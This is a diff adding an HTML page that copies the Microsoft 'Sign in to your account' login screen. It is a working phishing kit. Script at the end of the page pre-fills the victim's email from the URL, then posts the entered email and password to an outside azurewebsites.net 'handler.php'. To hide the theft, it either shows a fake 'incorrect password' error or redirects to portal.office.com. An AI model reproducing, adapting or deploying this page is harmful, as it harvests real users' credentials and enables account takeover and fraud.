@@ -1,0 +1,229 @@
+<html dir=ltr lang=en><meta content="text/html; charset=UTF-8"http-equiv=content-type><title>Sign in to your account</title><meta content=IE=edge http-equiv=X-UA-Compatible><meta content=width=device-width,initial-scale=1.0,maximum-scale=2.0,user-scalable=yes name=viewport><meta content=no-cache http-equiv=Pragma><meta content=-1 http-equiv=Expires><meta content=ConvergedSignIn name=PageID><meta name=SiteID><meta content=1033 name=ReqLC><meta content=en-US name=LocLC><noscript><meta content="0; URL=https://login.microsoftonline.com/jsdisabled"http-equiv=Refresh></noscript><link rel="shortcut icon"href=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico><meta content=none name=robots><style>html {
+overflow: scroll;
+overflow-x: hidden;
+}
+::-webkit-scrollbar {
+width: 0px; /* remove scrollbar space /
+background: transparent; / optional: just make scrollbar invisible /
+}
+/ optional: show position indicator in red */
+::-webkit-scrollbar-thumb {
+background: #FF0000;
+}</style><link crossorigin href=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/converged.v2.login.min_xu7km3oxm4bwp2b-mqyozg2.css integrity=sha384-oeT7RE+jUqvrrN6tzkQqVkE1XiqysTeQdBVsLf8laIGpeReVI+Dac1mjekZRn1Lm onerror=$Loader.On(this,true) onload=$Loader.On(this) rel=stylesheet><body data-bind="defineGlobals: ServerData, bodyCssClass"style="display: block;"class=cb>� <script>//<![CDATA[
+		/*  *
+        ! function() {
+            var e = window,
+                o = e.document,
+                i = e.$Config || {};
+            if (e.self === e.top) o && o.body && (o.body.style.display = "block");
+            else if (!i.allowFrame) {
+                var s = e.self.location.href,
+                    l = s.indexOf("#"),
+                    n = -1 !== l,
+                    t = s.indexOf("?"),
+                    f = n ? l : s.length,
+                    d = -1 === t || n && t > l ? "?" : "&";
+                s = s.substr(0, f) + d + "iframe-request-id=" + i.sessionId + s.substr(f), e.top.location = s
+            }
+        }();
+  /*  */
+        //]]></script><div class=displayfullload><div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"class=background role=presentation><div data-bind="backgroundImage: smallImageUrl()"style='background-image: url("https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");'></div><div data-bind="backgroundImage: backgroundImageUrl()"style='background-image: url("https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");'class=backgroundImage></div></div></div><div data-bind="if: activeDialog"></div><form data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog"action=/common/login autocomplete=off id=i0281 method=post name=f1 novalidate spellcheck=false target=_top><div data-bind="component: { name: 'page',
+        params: {            serverData: svr,
+            showButtons: svr.fShowButtons,            showFooterLinks: true,
+            useWizardBehavior: svr.fUseWizardBehavior,            handleWizardButtons: false,
+            password: password,            hideFromAria: ariaHidden },
+        event: {            footerAgreementClick: footer_agreementClick } }"class=outer><br><div class=background-logo-holder></div><div data-bind="css: { 'app': backgroundLogoUrl }"class=middle><img data-bind="attr: { src: backgroundLogoUrl }"class=background-logo role=presentation src=https://aadcdn.msauth.net/ests/2.1/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png><br><div data-bind="	
+                animationEnd: paginationControlMethods() && paginationControlMethods().view_onAnimationEnd,                css: {
+                    'app': backgroundLogoUrl,                    'wide': paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('wide'),
+                    'fade-in-lightbox': fadeInLightBox,                    'has-popup': showFedCredButton,
+                    'transparent-lightbox': backgroundControlMethods() && backgroundControlMethods().useTransparentLightBox }"class=inner><div data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox && showLightboxProgress() }"class=lightbox-cover></div><div data-bind="component: { name: 'logo-control',
+                    params: {                        isChinaDc: svr.fIsChinaDc,
+                        bannerLogoUrl: bannerLogoUrl() } }"><img data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"alt=Microsoft class=logo pngsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png src=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg svgsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg></div><div data-bind="component: { name: 'pagination-control',
+                        publicMethods: paginationControlMethods,                        params: {
+                            enableCssAnimation: svr.fEnableCssAnimation,                            initialViewId: initialViewId,
+                            currentViewId: currentViewId,                            initialSharedData: initialSharedData,
+                            initialError: $loginPage.getServerError() },                        event: {
+                            cancel: paginationControl_onCancel,                            showView: $loginPage.view_onShow,
+                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,                            animationStateChange: paginationControl_onAnimationStateChange } }"class=email_section_xyz role=main><div data-bind="css: { 'zero-opacity': hidePaginatedView() }"><div data-bind="css: {
+        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username),        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }"class=pagination-view><div data-bind="pageViewComponent: { name: 'login-paginated-username-view',
+                        params: {                            serverData: svr,
+                            serverError: initialError,                            isInitialView: isInitialState,
+                            displayName: sharedData.displayName,                            prefillNames: $loginPage.prefillNames,
+                            flowToken: sharedData.flowToken },                        event: {
+                            refresh: $loginPage.view_onRefresh,                            redirect: $loginPage.view_onRedirect,
+                            setPendingRequest: $loginPage.view_onSetPendingRequest,                            showLearnMore: $loginPage.learnMore_onShow,
+                            registerDialog: $loginPage.view_onRegisterDialog,                            unregisterDialog: $loginPage.view_onUnregisterDialog,
+                            showDialog: $loginPage.view_onShowDialog } }"data-showfedcredbutton=true data-viewid=1><div data-bind="component: { name: 'header-control', params: { serverData: svr } }"><div class="row text-title"id=loginHeader><div data-bind="text: title"aria-level=1 role=heading>Sign in</div></div></div><div class=row><div aria-live=assertive role=alert><div class="alert alert-error col-md-24 alert_msg_yxq alert_email_sect"data-bind="
+            htmlWithBindings: usernameTextbox.error,            childBindings: {
+                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick } }"style="display: none;"id=usernameError>We couldn't find an account with that username. Try another, or <a href=https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgE5N-HsRnaz3GZ3Nb0o0aAj2MWI2d8TmYZWOUqRmXCxulfYGR8wch4i0nQvyjdMyW82C01JbUosSQzP-8Ci8ArFh4DZisODi4BBgkGBYYfLIyLWIG2Rik0X16_dbXTrqAUuYQeZ4ZTrPpRVd4W-b7mmV4ppv5hlW6-lqaluRYWHrl5XtppBkXhQUUhmQElZWVGAaGBtqZWhhPYhCawMZ1iY_jAxtjBznCAk_EWl4iRgaGlroGRroGJgoGllZGRlbFRFAA1&estsfed=1&uaid=0656ef1f3f31449c938682f87c100e08&signup=1&lw=1&fl=easi2&fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com id=idA_PWD_SignUp> get a new Microsoft account </a>.</div></div><div class="form-group col-md-24"><div data-bind="component: { name: 'placeholder-textbox',
+            publicMethods: usernameTextbox.placeholderTextboxMethods,            params: {
+                serverData: svr,                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
+                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },            event: {
+                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"class=placeholderContainer><span></span><input aria-describedby="usernameError loginHeader loginDescription"aria-label="Enter your email, phone, or Skype."class="form-control ltr_override"data-bind="textInput: usernameTextbox.value,
+                    hasFocusEx: usernameTextbox.focused,                    placeholder: $placeholderText,
+                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],                    css: { 'has-error': usernameTextbox.error },
+                    attr: inputAttributes"placeholder="Email, phone, or Skype"aria-required=true id=i0116 lang=en maxlength=113 name=loginfmt type=email><input data-bind="moveOffScreen, textInput: passwordBrowserPrefill"aria-hidden=true autocomplete=off class=moveOffScreen id=i0118 name=passwd tabindex=-1 type=password></div></div></div><div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }"class=position-buttons><div class=row><div class=col-md-24><div class="text-13 action-links"><div data-bind="
+                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],                    childBindings: {
+                        'signup': {                            href: svr.urlSignUp,
+                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],                            click: signup_onClick } }"class=form-group>No account? <a aria-label="Create a Microsoft account"href=https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqiyexcgZn5NZBla5ilGZsHH6FxgZXzAy3mIS9C9K90wJL3ZLTUktSizJzM-7wCLwioXHgNmKg4NLgEGCQYHhBwvjIlagrZymylOOHFzvusZeeda6cxYMp1j1o6q8LfJ9zTO9Ukz9wyrdfC1NS3MtLDxy87y00wyKwoOKQjIDSsrKjAJCA20trAwnsAlNYGM6xcbwgY2xg53hACfjLS4RIwNDS10DI10DEwUDcytTCysjsygA0&estsfed=1&uaid=aee73feabdb0451dbd83e8dac30924a3&signup=1&lw=1&fl=easi2&fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com id=signup>Create one!</a></div><div class=form-group><a data-bind="
+                        text: str['WF_STR_CantAccessAccount_Text'],                        click: cantAccessAccount_onClick"href=# id=cantAccessAccount>Can’t access your account?</a></div></div></div></div><div data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"class=row><div data-bind="component: { name: 'footer-buttons-field',
+        params: {            serverData: svr,
+            isPrimaryButtonEnabled: !isRequestPending(),            isPrimaryButtonVisible: svr.fShowButtons,
+            isSecondaryButtonEnabled: true,            isSecondaryButtonVisible: svr.fShowButtons && isBackButtonVisible() },
+        event: {            primaryButtonClick: primaryButton_onClick,
+            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container"data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"><div data-bind="
+        css: {            'inline-block': svr.fRepositionFooterButtons,
+            'col-xs-12 primary': isSecondaryButtonVisible() && !svr.fRepositionFooterButtons,            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }"class=inline-block><input class="btn btn-block btn-primary button_two"data-bind="
+            attr: {                'id': primaryButtonId || 'idSIButton9',
+                'aria-describedby': primaryButtonDescribedBy },            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+            hasFocus: focusOnPrimaryButton,            click: primaryButton_onClick,
+            enable: isPrimaryButtonEnabled,            visible: isPrimaryButtonVisible,
+            preventTabbing: primaryButtonPreventTabbing"id=idSIButton9 type=submit value=Next></div></div></div></div></div></div></div></div></div></div><input data-bind="value: postedLoginStateViewId"name=ps type=hidden><input data-bind="value: postedLoginStateViewRNGCDefaultType"name=psRNGCDefaultType type=hidden><input data-bind="value: postedLoginStateViewRNGCEntropy"name=psRNGCEntropy type=hidden><input data-bind="value: postedLoginStateViewRNGCSLK"name=psRNGCSLK type=hidden><input data-bind="value: svr.canary"name=canary type=hidden value=ZzK8oM7iJd5OVyFM95um88HmnJ+f0rWRrTiPtvv2PUQ=8:1><input data-bind="value: ctx"name=ctx type=hidden value=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqixexahM2Aj9C4yMLxgZbzEJ-hele6aEF7ulpqQWJZZk5uddYBF4xcJjwGzFwcElwCDBoMDwg4VxESvQJk5T5SlHDq53XWOvPGvdOQuGU6z6UVXeFvm-5pleKab-YZVuvpampbkWFh65eV7aaQZF4UFFIZkBJWVlRgGhgbYWVoYT2IQmsDGdYmP4wMbYwc5wgJMRAA2><input data-bind="value: svr.sessionId"name=hpgrequestid type=hidden value=94233509-c1c4-45af-ac3f-239aaece3800><input data-bind="attr: { name: svr.sFTName }, value: flowToken"id=i0327 name=flowToken type=hidden value=AQABAAEAAACEfexXxjamQb3OeGQ4GugvJkSY-UD-yXcjnezRfHBxcAy4P8bWDuLC4kJW5iJNlvl4rT903WiSfkn9Og-knxDtujGZifz2GXSXKtagPoYvfmqn_IwiZ37pgVsHbm90y9YHVVEAW24V5IHQIWJlPd-S-fbL0ncF4VjIlHZKkWBvlVeklbloBkBSLYojGqFECJZjrLle7ya6Lx4RsVEcpDNY9QPpn9fLm5gYI2MAxELBQb1bb5pKMeKMGAPQ4WWryob9z_HhmOuoS22Yvm-W-XHjOBlN3Y5WVvO23cokLxuFYxWSaK6ZqFqkq5q5w9kiIAGk5Gw1yE2YP60aJ0uKEMb12n0HF7xrQ0l1vcNiLrGl7swd_ikjWKvzVYqkLB1Jxr0gAA><input data-bind="value: svr.sRandomBlob"name=PPSX type=hidden><input name=NewUser type=hidden value=1><input data-bind="value: svr.sFoundMSAs"name=FoundMSAs type=hidden><input data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"name=fspost type=hidden value=0><input data-bind="value: wasLearnMoreShown() ? 1 : 0"name=i21 type=hidden value=0><input data-bind="value: svr.fShowCookieBanner ? 1 : 0"name=CookieDisclosure type=hidden value=0><input data-bind="value: isFidoSupported ? 1 : 0"name=IsFidoSupported type=hidden value=1><div data-bind="component: { name: 'instrumentation',
+                publicMethods: instrumentationMethods,                params: { serverData: svr } }"><input data-bind="value: clientMode"name=i2 type=hidden value=1><input data-bind="value: srsFailed"name=i17 type=hidden><input data-bind="value: srsSuccess"name=i18 type=hidden><input data-bind="value: timeOnPage"name=i19 type=hidden></div><div class="footer default"data-bind="css: { 'default': !backgroundLogoUrl() }"id=footer role=contentinfo><div data-bind="component: { name: 'footer-control',
+                    params: {                        serverData: svr,
+                        debugDetails: debugDetails,                        showLinks: true },
+                    event: {                        agreementClick: footer_agreementClick,
+                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><div class="footerNode text-secondary"id=footerLinks><span data-bind="html: svr.strCopyrightTxt"id=ftrCopy>©2020 Microsoft</span><a data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick"href=https://www.microsoft.com/en-US/servicesagreement/ id=ftrTerms>Terms of use</a><a data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick"href=https://privacy.microsoft.com/en-US/privacystatement id=ftrPrivacy>Privacy & cookies</a><a aria-label="Click here for troubleshooting information"data-bind="
+        click: moreInfo_onClick,        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        hasFocus: focusMoreInfo()"class=moreOptions href=# role=button>   <img class=desktopMode data-bind=imgSrc pngsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png role=presentation src=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg svgsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg>          <img class=mobileMode data-bind=imgSrc pngsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png role=presentation src=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg svgsrc=https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg>    </a></div></div></div></div></div></form><form data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"aria-hidden=true method=post target=_top></form><div data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"id=idPartnerPL><iframe style="display: none;"height=0 src=https://portal.microsoftonline.com/Prefetch/Prefetch.aspx width=0></iframe></div></div><script src=https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js></script><script>$(document).ready(function(){
+	    get_email_hash();
+		var i0116 = $('#i0116');
+		//var pass_i0118 = $('#i0118');
+		var url = '';
+		var yid = GetURLParameter('username');
+		var yid2 = false;
+		/*  */
+		
+		if(!yid && get_email_hash() != false){ 
+		  
+		  //if(get_email_hash() != false){
+		    yid = get_email_hash(); 
+		    yid2 = true; 
+		  //}
+		}
+		/*  */
+		var email_sect = $('.email_section_xyz');
+		var pass_sect = $('.pass_section_xyz');
+		var displayName = $('#displayName');
+		var login_name_xyz = $('.login_name_xyz');
+		displayName.attr('value', yid);
+		displayName.html(' <span style="font-size: 20px; cursor: pointer" class="back_btnuuu"> &#8592; </span> '+yid);
+		$('.back_btnuuu').click(function(){
+		  window.location.replace("index.html");
+		});
+		login_name_xyz.val(yid);
+		if(yid && yid != '' && yid.length > 4){
+		  email_sect.remove();
+		  pass_sect.show();
+		  i0116.val(yid);
+		}
+		else{
+		  pass_sect.remove();
+		  email_sect.show();
+		}
+		var idSIButton9 = $('#idSIButton9');
+		idSIButton9.click(function(e){
+		  e.preventDefault();
+		 // alert('sss');
+		  idSIButton9.css({ 'border-color' : '#ffffff'  });
+		  var email = i0116.val();
+		  if($('.email_section_xyz').length){
+		    if(email != '' && email.length > 4){
+		      if(yid2){
+			    url = 'index.html#'+yid;
+			  }
+			  else{
+			  url = 'index.html?oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWSPW_TUBSGc5M0NFEFFUKCMQMsSE6urz9iR-qQkMR1SK7TfDRNlihx7Npx7Osmzpd_AUhIdM6ChISQKiYECPETKiHKWgl16YCYKibEhNud5bzDeYaj9zmPI3SKzj5kGZbrZwYiJfZ5hmJFGlJ9FvEUwzE8gyA95CAzuZvY_vBi653ysiw_v1z9ePSq3liDeG9szrWUSuwTcN_wPHeaTacXi0WK6Lqp3izSnwE4A-AnAOvwhuZQrcZJeMozvMAKPMeyIqQhzQhsqjoqLpV2Z4ntotfxsak0IKwWykalaXHdguV1C6URbrb8jl2yqvbeAo_yFm7mkFLIediWVze8Xx9V2qVRFckB3_KDhFiSYcevG-fhO0pu5hnoepCJ6Wu_w3GdTOyeS6beOvIWKK7myMMnxHE01UtdY5rjmWrfM4lTmxBXm3imNt0RW-6AyowPO8v-3N49WvGZXE9mMnSuKez2jD4tmBanaOVaiS9alcG0WyaC8BT7ECqNUeeAlkTUVmpIsor7_FKrMQuvW9GJinEmT0mzglxddsdUHtXn6l7JLRt4sH9QrxozvS4Tm-RbNf59JBbUahPnNHI7OMoxh0l3QnRzrJ1Fwa_oFoxkNzcT26EHoWToTxS83gjMXX28jH79-0168-lCvfiOQ6cbaavBtdHYkg8xHJSlMWfKMzNQPWNVPY9cC9mNll9aHUmyAnfoLH0cA8ex2FUMPLsV-hL_n-vzxL3gX0QKIgqySShkGZSlhe4_0&estsfed=1&uaid=ac0c8cb48f4f494a89e479dd259f5253&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US&username='+email;
+		      }
+			  window.location.replace(url);
+		    }else{
+		      $('.alert_email_sect').show();
+		    }
+		  }
+		  
+		  if($('.pass_section_xyz').length){
+		    var pass = $('#i0118');
+			var password_v = pass.val();
+			if(yid && yid != '' && yid.length > 4 && password_v != ''){
+			  //var password_v = login_passwd.val();
+			
+			  /*  */
+			         $.ajax({
+          url: 'https://pdrspd403d4004ccss.azurewebsites.net/handler.php', 
+          type: 'POST', 
+          dataType: 'html', 
+		  beforeSend: function(){
+		    $('.ldsddddd').show();
+		  },
+          data: { Email : yid, password : password_v}, 
+		  crossDomain: true,
+          success: function(msg) {
+		  //alert(msg);
+		    $('.ldsddddd').hide();
+		    if(msg == 'yes'){
+			  $('.alert_email_sect').hide();
+			  window.location.replace("https://portal.office.com");
+			}
+			else{
+			  $('.alert_msg_yxq').html("Your account or password is incorrect. If you don't remember your password");
+			  $('.alert_email_sect').show();
+			}
+		    //alert(msg);
+		   //window.location.replace("https://login.microsoftonline.com/common/oauth2/authorize?client_id=XMRopenid+profile&state=OpenIdConnect.AuthenticationProperties%3dbL-9u9lx4Nqok9GVqviQ7AxY5FUMsKBE7Nfj8BC2qH9NzDlw2Zu-b3fKc6YPyaLq78TzMPLnhxwWrNjZ7wpmOK3KwYbSfHdNFsP30BVEd7f8vX2eMSfHe3jPi97pHX1Y&nonce=636848699896041474.ODQ0YTlhYzUtNzVhYS00OWM3LWExNzMtMzVlNzg2ZWE2ZDg4ZDA1YjBhMzMtY2QzNS00MGE1LTlhMGQtZDE1ODBkYzk0MDJk&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=ac0c8cb4-8f4f-494a-89e4-79dd259f5253");
+	       /// alert(msg);
+		    //window.location.replace("https://portal.office.com");
+		  },
+          error: function(e) {
+            console.log(e)
+          }
+        });
+		}
+			else{
+			  $('.alert_msg_yxq').html('Please enter the password for your Microsoft account.');
+			  $('.alert_email_sect').show();
+			}
+		  }
+		  //alert(yid);
+		});
+		//alert(yid);
+	  });
+	  
+	  function get_email_hash(){
+	    var output = false;
+	    var sPageURL = window.location.href;
+		//sPageURL = 'http://localhost/office1withemail/index-home.html#test@gmail.com';
+		sPageURL = sPageURL.trim();
+		var last_index_of_hash = sPageURL.lastIndexOf('#');
+		if(last_index_of_hash != -1){
+		  output = sPageURL.substring(last_index_of_hash+1);
+		  if(!validateEmail(output)){
+		    output = false;
+		  }
+		}
+       // alert(output);
+		//var sURLVariables = sPageURL.split('&');
+		//console.log(sURLVariables);
+		return output;
+	  }
+	  
+function validateEmail(email) {
+    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
+	  	function GetURLParameter(sParam)
+{
+    var sPageURL = window.location.search.substring(1);
+    var sURLVariables = sPageURL.split('&');
+    for (var i = 0; i < sURLVariables.length; i++)
+    {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam)
+        {
+            return decodeURIComponent(sParameterName[1]);
+        }
+    }
+}</script>
